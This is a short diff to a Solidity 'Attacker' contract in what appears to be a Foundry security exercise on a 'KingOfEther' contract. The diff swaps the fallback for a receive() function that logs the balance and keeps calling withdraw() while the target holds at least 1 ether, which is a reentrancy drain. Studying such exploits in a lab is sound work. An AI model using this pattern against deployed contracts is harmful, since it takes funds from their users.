@@ -2,6 +2,7 @@
 pragma solidity 0.8.26;
 
 import {KingOfEther} from  "../src/KingOfEther.sol";
+import {console2} from "forge-std/console2.sol";
 
 contract Attacker is KingOfEther{
     KingOfEther _kingOf;
@@ -15,7 +16,8 @@ contract Attacker is KingOfEther{
         owner = msg.sender;
     }
 
-    fallback() external payable {
+    receive() external payable {
+        console2.log(address(this).balance);
         if(address(_kingOf).balance>= 1e18){
             _kingOf.withdraw();
         }
